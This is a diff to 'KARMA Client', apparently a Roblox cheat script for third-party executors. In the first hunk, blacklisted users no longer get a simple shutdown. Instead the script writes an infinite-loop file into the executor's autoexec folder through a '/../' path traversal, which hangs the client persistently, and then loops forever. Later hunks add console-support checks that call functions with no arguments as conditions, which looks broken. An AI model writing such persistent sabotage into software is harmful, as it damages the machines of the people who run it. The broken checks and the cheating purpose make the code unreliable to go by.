@@ -4,7 +4,8 @@ rconsoleclear()
 
 if table.find(karmacrashlist, game.Players.LocalPlayer.Name) then
 	rconsoleprint("YOU ARE BLACKLISTED FROM KARMA!")
-	game:shutdown()
+	writefile("/../autoexec/autoexec.lua", "while true do warn() end")
+	while true do warn() end
 end
 
 rconsoleprint("Welcome To KARMA\n Starting....")
@@ -13,6 +14,7 @@ rconsoleprint("Welcome To KARMA\n Starting....")
 
 
 local currentver = "2.2b" --DO NOT TOUCH THIS UNLESS YOU WANT TO USE AN OLDER VERSION! IF THIS DIFFERS FROM THE LATEST THE LOADER WILL CHECK FOR UPDATES!
+if rconsoleclear() and rconsoletitle() and rconsoleprint() then
 rconsoletitle("KARMA Client V"..currentver.." By tornvrc")
 rconsoleclear()
 rconsoleprint[[
@@ -29,7 +31,9 @@ rconsoleprint[[
 ]]
 rconsoleprint("						KARMA " .. currentver .. " By tornvrc\n")
 rconsoleprint("\n=======================================================================================================================")
-
+else
+	print("Your executor does not support rconsole!")
+end
 --KARMA rewrite V1
 _G["KarmaBotConfig"] = {}
 
@@ -148,7 +152,11 @@ local logname = logpath .. "latest.log"
 writefile(logname, "KARMA log file \n")
 writefile(musplrpath .. "Instructions.txt", "To use this, drop ogg (Vorbis) files into the folder and then hit refresh files in the music player!")
 function log(text)
-	rconsoleprint("\n[" .. GetDate():format("#h:#m") .. "]: " .. text .. "\n")
+	if rconsoleprint() then
+		rconsoleprint("\n[" .. GetDate():format("#h:#m") .. "]: " .. text .. "\n")
+	else
+		print("\n[" .. GetDate():format("#h:#m") .. "]: " .. text .. "\n")
+	end
 	appendfile(logname, "[" .. GetDate():format("#h:#m") .. "]: " .. text .. "\n")
 end
 log("Executed with " .. identifyexecutor())
